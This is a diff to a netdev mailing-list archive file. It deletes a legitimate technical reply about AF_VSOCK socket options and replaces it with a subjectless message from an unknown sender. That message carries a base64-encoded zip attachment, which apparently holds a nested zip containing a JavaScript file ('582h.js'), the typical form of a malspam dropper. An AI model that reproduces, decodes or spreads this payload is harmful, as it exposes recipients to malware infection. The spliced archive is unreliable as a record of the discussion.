@@ -1,85 +1,72 @@
-From: Stefan Hajnoczi <stefanha@redhat.com>
-Subject: Re: AF_VSOCK unimplemented sockopts
-Date: Tue, 15 Aug 2017 09:36:18 +0100
-Message-ID: <20170815083618.GD32702@stefanha-x1.localdomain>
-References: <20170803104116.GA22685@stefanha-x1.localdomain>
- <9D465B5B-5A07-4250-8AB3-DEC80CCC45B7@vmware.com>
+From: <ccc@mail.com>
+Subject: (unknown)
+Date: Tue, 15 Aug 2017 08:46:07 -0000
+Message-ID: <150278676737.15189.7878346455430750030@vnpt.vn>
 Mime-Version: 1.0
-Content-Type: multipart/signed; micalg=pgp-sha1;
-        protocol="application/pgp-signature"; boundary="LKTjZJSUETSlgu2t"
-Cc: "netdev@vger.kernel.org" <netdev@vger.kernel.org>
-To: "Jorgen S. Hansen" <jhansen@vmware.com>
+Content-Type: application/zip; name="765228233.zip"
+Content-Transfer-Encoding: base64
+To: <netdev@vger.kernel.org>
 Return-path: <netdev-owner@vger.kernel.org>
-Received: from mx1.redhat.com ([209.132.183.28]:36570 "EHLO mx1.redhat.com"
-        rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
-        id S1752613AbdHOIgU (ORCPT <rfc822;netdev@vger.kernel.org>);
-        Tue, 15 Aug 2017 04:36:20 -0400
-Content-Disposition: inline
-In-Reply-To: <9D465B5B-5A07-4250-8AB3-DEC80CCC45B7@vmware.com>
+Received: from static.vnpt.vn ([14.234.120.132]:51142 "HELO vnpt.vn"
+        rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S1752757AbdHOIqM (ORCPT <rfc822;netdev@vger.kernel.org>);
+        Tue, 15 Aug 2017 04:46:12 -0400
+Content-Disposition: attachment
+Subject: 
 Sender: netdev-owner@vger.kernel.org
 List-ID: <netdev.vger.kernel.org>
 
-
---LKTjZJSUETSlgu2t
-Content-Type: text/plain; charset=utf-8
-Content-Disposition: inline
-Content-Transfer-Encoding: quoted-printable
-
-On Fri, Aug 11, 2017 at 09:23:17AM +0000, Jorgen S. Hansen wrote:
-> > On Aug 3, 2017, at 12:41 PM, Stefan Hajnoczi <stefanha@redhat.com> wrot=
-e:
-> >=20
-> > Hi Jorgen,
-> > There are 3 sockopts defined in include/uapi/linux/vm_sockets.h that are
-> > currently not implemented in net/vmw_vsock/af_vsock.c:
-> >=20
-> > * SO_VM_SOCKETS_PEER_HOST_VM_ID
-> > * SO_VM_SOCKETS_TRUSTED
-> > * SO_VM_SOCKETS_NONBLOCK_TXRX
-> >=20
-> > I noticed this because SO_VM_SOCKETS_TRUSTED is interesting for
-> > virtio-vsock.  Services listening on AF_VSOCK inside the guest may not
-> > want arbitrary unprivileged host processes to connect.  Instead of
-> > inventing a new solution I wanted to look into SO_VM_SOCKETS_TRUSTED but
-> > found it is not implemented in linux.git.
-> >=20
-> > What is the status of these sockets?
->=20
-> These options were only implemented for ESX host endpoints, so were never=
- part of the Linux host side support. It looks like they could have been om=
-itted from vm_sockets.h, when the initial upstreaming was performed.
->=20
-> On ESX, the equivalent of SO_VM_SOCKETS_TRUSTED, is used for retrieving t=
-he value of s->trusted of a VMCI socket. It cannot be used to mark a socket=
- as trusted. On Linux, trusted is tied to the CAP_NET_ADMIN capability of t=
-he socket creator. VMCI based vSockets will per default only allow host sid=
-e sockets that are trusted, or are created by the same user as the VM, to c=
-ommunicate with a given VM. This is achieved by per default creating VMs wi=
-th the VMCI privilege flag VMCI_PRIVILEGE_FLAG_RESTRICTED. It is possible t=
-o create a VM that isn=E2=80=99t restricted, in which case any host process=
- will be able to communicate with the VM.
->=20
-> So it should be straight forward to implement the getsockopt part of SO_V=
-M_SOCKETS_TRUSTED, since it just needs to return s->trusted.
-
-Currently virtio-vsock does not implement the 'restricted' mode but I'm
-evaluating using it by default for stronger security.  Thanks for your
-response!
-
-Stefan
-
---LKTjZJSUETSlgu2t
-Content-Type: application/pgp-signature; name="signature.asc"
-
------BEGIN PGP SIGNATURE-----
-
-iQEcBAEBAgAGBQJZkrKCAAoJEJykq7OBq3PI7OwH/1Hwgiku2/JlcGMlOX7npqEC
-62sVablsbdcr8IRuzJfOjgDwC++tWWcd3TB0aI8MhNXPEzzIyaxLL5uWTFr5lRCC
-32+X5EDlrxWrxccZGHvYhRWY1TbMs2JMVXCaPIJaeOmXjcVk3JqXsvyQ691paruc
-PVkt0ImyplXJe13sykXc4eY8FXyQ7WbmBwhg8m3CnSepxtJR1d2r3Kp2bwzifjvB
-d6m4TfffxARr+CJumP8Em71gnE7oQAifVK3xzleh7dMw6e3ONgKkmSlZQS0MGI6Y
-ix0O/mO6sruaUIQI1IvbinQLAMdqRKUUFIEocO2scYgNejfJNnJGxkSgY7ZI+T8=
-=M0kt
------END PGP SIGNATURE-----
-
---LKTjZJSUETSlgu2t--
+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
+AQBdAAAAZgsAAAAA
